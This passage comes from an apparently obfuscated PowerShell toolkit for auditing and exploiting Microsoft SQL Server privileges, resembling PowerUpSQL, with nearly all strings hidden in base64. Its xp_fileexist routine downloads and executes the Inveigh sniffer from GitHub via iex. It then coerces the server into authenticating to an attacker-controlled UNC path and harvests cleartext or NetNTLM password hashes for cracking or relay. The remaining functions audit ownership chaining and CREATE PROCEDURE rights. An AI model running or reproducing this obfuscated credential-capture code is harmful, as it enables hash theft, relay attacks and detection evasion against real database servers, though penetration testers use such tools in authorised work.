        $ExploitCmd    = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGEAYwBrACAAdABoAGUAIABwAGEAcwBzAHcAbwByAGQAIABoAGEAcwBoACAAbwBmAGYAbABpAG4AZQAgAG8AcgAgAHIAZQBsAGEAeQAgAGkAdAAgAHQAbwAgAGEAbgBvAHQAaABlAHIAIABzAHkAcwB0AGUAbQAuAA==')))
        $Details       = ''
        $Reference     = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAGIAbABvAGcALgBuAGUAdABzAHAAaQAuAGMAbwBtAC8AZQB4AGUAYwB1AHQAaQBuAGcALQBzAG0AYgAtAHIAZQBsAGEAeQAtAGEAdAB0AGEAYwBrAHMALQB2AGkAYQAtAHMAcQBsAC0AcwBlAHIAdgBlAHIALQB1AHMAaQBuAGcALQBtAGUAdABhAHMAcABsAG8AaQB0AC8A')))
        $Author        = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAG8AdAB0ACAAUwB1AHQAaABlAHIAbABhAG4AZAAgACgAQABfAG4AdQBsAGwAYgBpAG4AZAApACwAIABOAGUAdABTAFAASQAgADIAMAAxADYA')))
        $DirTreePrivs = Get-SQLDatabasePriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName master -SuppressVerbose | ? -FilterScript {
            $_.ObjectName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eABwAF8AZgBpAGwAZQBlAHgAaQBzAHQA'))) -and $_.PermissionName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAQwBVAFQARQA='))) -and $_.statedescription -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAGEAbgB0AA==')))
        }
        if($DirTreePrivs)
        {
            Write-Verbose -Message "$Instance : - The $PrincipalName principal has EXECUTE privileges on xp_fileexist."
            $IsVulnerable  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
            $DirTreePrivs |
            % {
                $PrincipalName = $DirTreePrivs.PrincipalName
                $CurrentPrincpalList |
                % {
                    $PrincipalCheck = $_
                    if($PrincipalName -eq $PrincipalCheck)
                    {
                        $IsExploitable  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                        $CurrentIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                        $prp = New-Object -TypeName System.Security.Principal.WindowsPrincipal -ArgumentList ($CurrentIdentity)
                        $adm = [System.Security.Principal.WindowsBuiltInRole]::Administrator
                        $IsAdmin = $prp.IsInRole($adm)
                        if (-not $IsAdmin)
                        {
                            Write-Verbose -Message "$Instance : - You do not have Administrator rights. Run this function as an Administrator in order to load Inveigh."
                            $IAMADMIN = 'No'
                        }
                        else
                        {
                            Write-Verbose -Message "$Instance : - You have Administrator rights. Inveigh will be loaded."
                            $IAMADMIN = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                        }
                        if(-not $AttackerIp)
                        {
                            $AttackerIp = (Test-Connection -ComputerName 127.0.0.1 -Count 1 |
                            select -ExpandProperty Ipv4Address |
                            select -Property IPAddressToString -ExpandProperty IPAddressToString)
                            if($AttackerIp -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAyADcALgAwAC4AMAAuADEA'))))
                            {
                                $AttackerIp = gwmi -Class win32_networkadapterconfiguration -Filter "ipenabled = 'True'" -ComputerName $env:COMPUTERNAME |
                                select -First 1 -Property @{
                                    Name       = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEEAZABkAHIAZQBzAHMA')))
                                    Expression = {
                                        [regex]$rx = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABcAGQAewAxACwAMwB9ACgAXAAuAD8AKQApAHsANAB9AA=='))); $rx.matches($_.IPAddress)[0].Value
                                    }
                                } |
                                select -Property IPaddress -ExpandProperty IPAddress -First 1
                            }
                        }
                        if($IAMADMIN -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                        {
                            iex -Command (New-Object -TypeName system.net.webclient).downloadstring($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBLAGUAdgBpAG4ALQBSAG8AYgBlAHIAdABzAG8AbgAvAEkAbgB2AGUAaQBnAGgALwBtAGEAcwB0AGUAcgAvAEkAbgB2AGUAaQBnAGgALgBwAHMAMQA='))))
                            $TestIt = Test-Path -Path Function:\Invoke-Inveigh
                            if($TestIt -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAZQA='))))
                            {
                                Write-Verbose -Message "$Instance : - Inveigh loaded."
                                $InstanceIP = [System.Net.Dns]::GetHostAddresses($ComputerName)
                                Write-Verbose -Message "$Instance : - Start sniffing..."
                                $null = Invoke-Inveigh -HTTP N -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue -IP $AttackerIp
                                $path = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}))
                                Write-Verbose -Message "$Instance : - Inject UNC path to \\$AttackerIp\$path..."
                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "xp_fileexist '\\$AttackerIp\$path'" -TimeOut 10 -SuppressVerbose
								Write-Verbose -Message "$Instance : - Sleeping for $TimeOut seconds to ensure the hash comes back"
                                sleep -s $TimeOut
                                $null = Stop-Inveigh
                                Write-Verbose -Message "$Instance : - Stopped sniffing."
                                $HashType = ''
                                $Hash = ''
                                [string]$PassCleartext = Get-Inveigh -Cleartext
                                if($PassCleartext)
                                {
                                    $HashType = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGUAYQByAHQAZQB4AHQA')))
                                    $Hash = $PassCleartext
                                }
                                [string]$PassNetNTLMv1 = Get-Inveigh -NTLMv1
                                if($PassNetNTLMv1)
                                {
                                    $HashType = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQATgBUAEwATQB2ADEA')))
                                    $Hash = $PassNetNTLMv1
                                }
                                [string]$PassNetNTLMv2 = Get-Inveigh -NTLMv2
                                if($PassNetNTLMv2)
                                {
                                    $HashType = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQATgBUAEwATQB2ADIA')))
                                    $Hash = $PassNetNTLMv2
                                }
                                if($Hash)
                                {
                                    Write-Verbose -Message "$Instance : - Recovered $HashType hash:"
                                    Write-Verbose -Message "$Instance : - $Hash"
                                    $Exploited = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                                    $Details = "The $PrincipalName principal has EXECUTE privileges on xp_fileexist procedure in the master database. Recovered password hash! Hash type = $HashType;Hash = $Hash"
                                }
                                else
                                {
                                    $Exploited = 'No'
                                    $Details = "The $PrincipalName principal has EXECUTE privileges on xp_fileexist procedure in the master database.  xp_fileexist Executed, but no password hash was recovered."
                                }
                                $null = Clear-Inveigh
                            }
                            else
                            {
                                Write-Verbose -Message "$Instance : - Inveigh could not be loaded."
                                $Exploited = 'No'
                                $Details = "The $PrincipalName principal has EXECUTE privileges on xp_fileexist procedure in the master database, but Inveigh could not be loaded so no password hashes could be recovered."
                            }
                        }
                        else
                        {
                            $Exploited = 'No'
                            $Details = "The $PrincipalName principal has EXECUTE privileges on xp_fileexist procedure in the master database."
                        }
                    }
                    else
                    {
                        $IsExploitable  = 'No'
                        $Details = "The $PrincipalName principal has EXECUTE privileges on xp_fileexist procedure in the master database."
                    }
                }
                $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
            }      
        }else{
            Write-Verbose -Message "$Instance : - No logins were found with the EXECUTE privilege on xp_fileexist."
        }
    }
    End
    {
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - xp_fileexist"
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}
Function Invoke-SQLAuditPrivDbChaining
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select non default databases.')]
        [switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [switch]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )
    Begin
    {
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
    }
    Process
    {
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - Database Ownership Chaining"
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not $TestConnection)
        {
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Database Ownership Chaining."
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $CurrentLogin = $ServerInfo.CurrentLogin
        $ComputerName = $ServerInfo.ComputerName
        if($Exploit)
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdAA=')))
        }
        else
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AA==')))
        }
        $Vulnerability = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBzAHMAaQB2AGUAIABQAHIAaQB2AGkAbABlAGcAZQAgAC0AIABEAGEAdABhAGIAYQBzAGUAIABPAHcAbgBlAHIAcwBoAGkAcAAgAEMAaABhAGkAbgBpAG4AZwA=')))
        $Description   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAHMAaABpAHAAIABjAGgAYQBpAG4AaQBuAGcAIAB3AGEAcwAgAGYAbwB1AG4AZAAgAGUAbgBhAGIAbABlAGQAIABhAHQAIAB0AGgAZQAgAHMAZQByAHYAZQByACAAbwByACAAZABhAHQAYQBiAGEAcwBlACAAbABlAHYAZQBsAC4AIAAgAEUAbgBhAGIAbABpAG4AZwAgAG8AdwBuAGUAcgBzAGgAaQBwACAAYwBoAGEAaQBuAGkAbgBnACAAYwBhAG4AIABsAGUAYQBkACAAdABvACAAdQBuAGEAdQB0AGgAbwByAGkAegBlAGQAIABhAGMAYwBlAHMAcwAgAHQAbwAgAGQAYQB0AGEAYgBhAHMAZQAgAHIAZQBzAG8AdQByAGMAZQBzAC4A')))
        $Remediation   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AZgBpAGcAdQByAGUAZAAgAHQAaABlACAAYQBmAGYAZQBjAHQAZQBkACAAZABhAHQAYQBiAGEAcwBlACAAcwBvACAAdABoAGUAIAAnAGkAcwBfAGQAYgBfAGMAaABhAGkAbgBpAG4AZwBfAG8AbgAnACAAZgBsAGEAZwAgAGkAcwAgAHMAZQB0ACAAdABvACAAJwBmAGEAbABzAGUAJwAuACAAIABBACAAcQB1AGUAcgB5ACAAcwBpAG0AaQBsAGEAcgAgAHQAbwAgACcAQQBMAFQARQBSACAARABBAFQAQQBCAEEAUwBFACAARABhAHQAYQBiAGEAcwBlADEAIABTAEUAVAAgAEQAQgBfAEMASABBAEkATgBJAE4ARwAgAE8ATgAnACAAaQBzACAAdQBzAGUAZAAgAGUAbgBhAGIAbABlACAAYwBoAGEAaQBuAGkAbgBnAC4AIAAgAEEAIABxAHUAZQByAHkAIABzAGkAbQBpAGwAYQByACAAdABvACAAJwBBAEwAVABFAFIAIABEAEEAVABBAEIAQQBTAEUAIABEAGEAdABhAGIAYQBzAGUAMQAgAFMARQBUACAARABCAF8AQwBIAEEASQBOAEkATgBHACAATwBGAEYAOwAnACAAYwBhAG4AIABiAGUAIAB1AHMAZQBkACAAdABvACAAZABpAHMAYQBiAGwAZQAgAGMAaABhAGkAbgBpAG4AZwAuAA==')))
        $Severity      = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcA')))
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAcgBlACAAaQBzACAAbgBvAHQAIABlAHgAcABsAG8AaQB0ACAAYQB2AGEAaQBsAGEAYgBsAGUAIABhAHQAIAB0AGgAaQBzACAAdABpAG0AZQAuAA==')))
        $Details       = ''
        $Reference     = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAHQAZQBjAGgAbgBlAHQALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AZQBuAC0AdQBzAC8AbABpAGIAcgBhAHIAeQAvAG0AcwAxADgAOAA2ADcANgAoAHYAPQBzAHEAbAAuADEAMAA1ACkALgBhAHMAcAB4ACwAaAB0AHQAcABzADoALwAvAG0AcwBkAG4ALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AZQBuAC0AdQBzAC8AbABpAGIAcgBhAHIAeQAvAGIAYgA2ADYAOQAwADUAOQAoAHYAPQB2AHMALgAxADEAMAApAC4AYQBzAHAAeAAgAA==')))
        $Author        = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAG8AdAB0ACAAUwB1AHQAaABlAHIAbABhAG4AZAAgACgAQABfAG4AdQBsAGwAYgBpAG4AZAApACwAIABOAGUAdABTAFAASQAgADIAMAAxADYA')))
        if($NoDefaults)
        {
            $ChainDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -NoDefaults -SuppressVerbose | ? -FilterScript {
                $_.is_db_chaining_on -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAZQA=')))
            }
        }
        else
        {
            $ChainDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
                $_.is_db_chaining_on -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAZQA=')))
            }
        }
        if($ChainDatabases)
        {
            $IsVulnerable  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
            $ChainDatabases |
            % -Process {
                $DatabaseName = $_.DatabaseName
                Write-Verbose -Message "$Instance : - The database $DatabaseName has ownership chaining enabled."
                $Details = "The database $DatabaseName was found configured with ownership chaining enabled."
                $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
            }
        }
        else
        {
            Write-Verbose -Message "$Instance : - No non-default databases were found with ownership chaining enabled."
        }
        $ServerCheck = Get-SQLServerConfiguration -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBjAGgAYQBpAG4AKgA='))) -and $_.config_value -eq 1
        }
        if($ServerCheck)
        {
            $IsVulnerable  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
            Write-Verbose -Message "$Instance : - The server configuration 'cross db ownership chaining' is set to 1.  This can affect all databases."
            $Details = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABzAGUAcgB2AGUAcgAgAGMAbwBuAGYAaQBnAHUAcgBhAHQAaQBvAG4AIAAnAGMAcgBvAHMAcwAgAGQAYgAgAG8AdwBuAGUAcgBzAGgAaQBwACAAYwBoAGEAaQBuAGkAbgBnACcAIABpAHMAIABzAGUAdAAgAHQAbwAgADEALgAgACAAVABoAGkAcwAgAGMAYQBuACAAYQBmAGYAZQBjAHQAIABhAGwAbAAgAGQAYQB0AGEAYgBhAHMAZQBzAC4A')))
            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
        }
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Database Ownership Chaining"
    }
    End
    {
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}
Function Invoke-SQLAuditPrivCreateProcedure
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )
    Begin
    {
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
    }
    Process
    {
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: PERMISSION - CREATE PROCEDURE"
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not $TestConnection)
        {
            Write-Verbose -Message "$Instance : CONNECTION FAILED"
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: PERMISSION - CREATE PROCEDURE"
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS"
        }
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $ComputerName = $ServerInfo.ComputerName
        $CurrentLogin = $ServerInfo.CurrentLogin
        $CurrentLoginRoles = Get-SQLServerRoleMember -Instance $Instance  -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin -SuppressVerbose
        $CurrentPrincpalList = @()
        $CurrentPrincpalList += $CurrentLogin
        $CurrentPrincpalList += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))
        $CurrentLoginRoles |
        % -Process {
            $CurrentPrincpalList += $_.RolePrincipalName
        }
        if($Exploit)
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdAA=')))
        }
        else
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AA==')))
        }
        $Vulnerability = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFAFIATQBJAFMAUwBJAE8ATgAgAC0AIABDAFIARQBBAFQARQAgAFAAUgBPAEMARQBEAFUAUgBFAA==')))
        $Description   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABsAG8AZwBpAG4AIABoAGEAcwAgAHAAcgBpAHYAaQBsAGUAZwBlAHMAIAB0AG8AIABjAHIAZQBhAHQAZQAgAHMAdABvAHIAZQBkACAAcAByAG8AYwBlAGQAdQByAGUAcwAgAGkAbgAgAG8AbgBlACAAbwByACAAbQBvAHIAZQAgAGQAYQB0AGEAYgBhAHMAZQBzAC4AIAAgAFQAaABpAHMAIABtAGEAeQAgAGEAbABsAG8AdwAgAHQAaABlACAAbABvAGcAaQBuACAAdABvACAAZQBzAGMAYQBsAGEAdABlACAAcAByAGkAdgBpAGwAZQBnAGUAcwAgAHcAaQB0AGgAaQBuACAAdABoAGUAIABkAGEAdABhAGIAYQBzAGUALgA=')))
        $Remediation   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBmACAAdABoAGUAIABwAGUAcgBtAGkAcwBzAGkAbwBuACAAaQBzACAAbgBvAHQAIAByAGUAcQB1AGkAcgBlAGQAIAByAGUAbQBvAHYAZQAgAGkAdAAuACAAIABQAGUAcgBtAGkAcwBzAGkAbwBuAHMAIABhAHIAZQAgAGcAcgBhAG4AdABlAGQAIAB3AGkAdABoACAAYQAgAGMAbwBtAG0AYQBuAGQAIABsAGkAawBlADoAIABHAFIAQQBOAFQAIABDAFIARQBBAFQARQAgAFAAUgBPAEMARQBEAFUAUgBFACAAVABPACAAdQBzAGUAcgAsACAAYQBuAGQAIABjAGEAbgAgAGIAZQAgAHIAZQBtAG8AdgBlAGQAIAB3AGkAdABoACAAYQAgAGMAbwBtAG0AYQBuAGQAIABsAGkAawBlADoAIABSAEUAVgBPAEsARQAgAEMAUgBFAEEAVABFACAAUABSAE8AQwBFAEQAVQBSAEUAIABUAE8AIAB1AHMAZQByAA==')))
        $Severity      = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGQAaQB1AG0A')))
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = "No exploit is currently available that will allow $CurrentLogin to become a sysadmin."
        $Details       = ''
        $Dependancies = ''
        $Reference     = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAG0AcwBkAG4ALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AZQBuAC0AdQBzAC8AbABpAGIAcgBhAHIAeQAvAG0AcwAxADgANwA5ADIANgAuAGEAcwBwAHgAPwBmAD0AMgA1ADUAJgBNAFMAUABQAEUAcgByAG8AcgA9AC0AMgAxADQANwAyADEANwAzADkANgA=')))
        $Author        = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAG8AdAB0ACAAUwB1AHQAaABlAHIAbABhAG4AZAAgACgAQABfAG4AdQBsAGwAYgBpAG4AZAApACwAIABOAGUAdABTAFAASQAgADIAMAAxADYA')))
        $Permissions = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -SuppressVerbose | Get-SQLDatabasePriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PermissionName $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBSAEUAQQBUAEUAIABQAFIATwBDAEUARABVAFIARQA=')))
        if($Permissions)
        {
            $CurrentPrincpalList|
            % -Process {
                $CurrentPrincipal = $_
                $Permissions |
                % -Process {
                    $AffectedPrincipal = $_.PrincipalName
                    $AffectedDatabase = $_.DatabaseName
                    if($AffectedPrincipal -eq $CurrentPrincipal)
                    {
                        $IsVulnerable  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                        Write-Verbose -Message "$Instance : - The $AffectedPrincipal principal has the CREATE PROCEDURE permission in the $AffectedDatabase database."
                        $Details = "The $AffectedPrincipal principal has the CREATE PROCEDURE permission in the $AffectedDatabase database."
                        $HasAlterSchema = Get-SQLDatabasePriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PermissionName $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBMAFQARQBSAA=='))) -PermissionType $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBDAEgARQBNAEEA'))) -PrincipalName $CurrentPrincipal -DatabaseName $AffectedDatabase  -SuppressVerbose
                        if($HasAlterSchema)
                        {
                            $IsExploitable = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                            $Dependancies = " $CurrentPrincipal also has ALTER SCHEMA permissions so procedures can be created."
                            Write-Verbose -Message "$Instance : - Dependancies were met: $CurrentPrincipal has ALTER SCHEMA permissions."
                            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, "$Details$Dependancies", $Reference, $Author)
                        }
                        else
                        {
                            $IsExploitable = 'No'
                            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                        }
                        if($Exploit -and $IsExploitable -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                        {
                            Write-Verbose -Message "$Instance : - No server escalation method is available at this time."
                        }
                    }
                }
            }
        }
        else
        {
